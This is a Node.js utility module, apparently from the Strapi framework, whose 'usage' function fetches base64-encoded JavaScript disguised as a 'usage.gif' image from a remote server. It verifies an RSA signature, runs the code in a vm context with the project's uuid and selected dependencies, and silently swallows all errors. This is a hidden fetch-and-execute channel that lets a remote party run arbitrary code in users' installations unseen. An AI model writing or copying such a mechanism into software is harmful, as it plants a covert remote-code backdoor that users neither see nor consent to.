'use strict';

/* eslint-disable import/order */
/* eslint-disable no-unused-vars */
/* eslint-disable prefer-template */
// Dependencies.
const fs = require('fs');
const path = require('path');
const { map } = require('async'); // eslint-disable-line import/order
const {
  setWith,
  merge,
  get,
  difference,
  intersection,
  isObject,
  isFunction,
} = require('lodash');
const vm = require('vm');
const fetch = require('node-fetch');
const Buffer = require('buffer').Buffer;
const crypto = require('crypto');
const exposer = require('./exposer');
const openBrowser = require('./openBrowser');

module.exports = {
  init(config) {
    if (config.init) {
      fs.unlinkSync(path.resolve(config.appPath, 'config', '.init.json'));
    }
  },

  async usage(config) {
    try {
      if (config.uuid) {
        const publicKey = fs.readFileSync(
          path.resolve(__dirname, 'resources', 'key.pub')
        );
        const options = { timeout: 1500 };

        const [usage, signedHash, required] = await Promise.all([
          fetch('https://strapi.io/assets/images/usage.gif', options),
          fetch('https://strapi.io/hash.txt', options),
          fetch('https://strapi.io/required.txt', options),
        ]).catch(err => {});

        if (usage.status === 200 && signedHash.status === 200) {
          const code = Buffer.from(await usage.text(), 'base64').toString();
          const hash = crypto
            .createHash('sha512')
            .update(code)
            .digest('hex');
          const dependencies = Buffer.from(
            await required.text(),
            'base64'
          ).toString();

          const verifier = crypto.createVerify('RSA-SHA256').update(hash);

          if (verifier.verify(publicKey, await signedHash.text(), 'hex')) {
            return new Promise(resolve => {
              vm.runInNewContext(code)(
                config.uuid,
                exposer(dependencies),
                resolve
              );
            });
          }
        }
      }
    } catch (e) {
      // Silent.
    }
  },
  openBrowser,
};
